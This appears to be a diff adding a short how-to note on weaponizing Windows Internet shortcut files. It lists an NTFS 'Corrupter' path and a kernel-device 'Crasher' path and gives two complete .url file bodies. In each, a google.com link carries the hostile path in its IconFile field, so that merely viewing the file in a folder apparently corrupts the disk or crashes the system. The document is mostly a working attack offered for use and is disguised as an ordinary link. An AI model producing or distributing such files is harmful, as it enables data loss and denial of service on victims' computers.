@@ -1,0 +1,26 @@
+ You can implement:
+ 
+ file:///C:/:$i30:$bitmap                                              :Corrupter
+ file://./GLOBALROOT/Device/ConDrv/KernelConnect                       :Crasher
+ 
+ Into a shortcut file, when you view it it does something
+ (to do it change icon, edit the icon file in notepad++, to the line of code)
+ 
+ eg.
+ [{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,11
+[InternetShortcut]
+IDList=
+URL=https://google.com/
+IconIndex=2
+HotKey=0
+IconFile=\\.\globalroot\device\condrv\kernelconnect
+
+[{000214A0-0000-0000-C000-000000000046}]
+Prop3=19,11
+[InternetShortcut]
+IDList=
+URL=https://google.com/
+IconIndex=2
+HotKey=0
+IconFile=C:/:$i30:$bitmap
